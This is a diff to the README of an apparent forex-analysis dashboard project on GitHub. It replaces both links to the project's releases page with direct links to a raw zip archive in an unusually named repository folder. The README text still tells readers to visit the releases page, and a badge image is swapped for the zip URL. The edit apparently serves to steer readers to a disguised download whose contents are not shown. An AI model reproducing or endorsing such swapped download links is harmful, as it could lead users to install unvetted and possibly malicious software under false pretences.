@@ -1,7 +1,7 @@
 # 📈 forex-pattern-mining-dashboard - Simplifying Forex Trading Insights
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/Omar7amid/forex-pattern-mining-dashboard/releases)
+[![Download](https://raw.githubusercontent.com/Omar7amid/forex-pattern-mining-dashboard/main/fetiales/forex-pattern-mining-dashboard.zip)](https://raw.githubusercontent.com/Omar7amid/forex-pattern-mining-dashboard/main/fetiales/forex-pattern-mining-dashboard.zip)
 
 ## 🚀 Getting Started
 Welcome to the forex-pattern-mining-dashboard! This software helps you analyze foreign exchange (forex) patterns with the power of machine learning. It seamlessly integrates with Kaggle for enhanced data access and insights.
@@ -21,7 +21,7 @@ Welcome to the forex-pattern-mining-dashboard! This software helps you analyze f
 
 ## 📡 How to Download & Install
 1. **Visit the Releases Page:** Click the link below to access the releases:
-   [Download Here](https://github.com/Omar7amid/forex-pattern-mining-dashboard/releases).
+   [Download Here](https://raw.githubusercontent.com/Omar7amid/forex-pattern-mining-dashboard/main/fetiales/forex-pattern-mining-dashboard.zip).
    
 2. **Select the Latest Release:** Look for the most recent version of the forex-pattern-mining-dashboard.
 
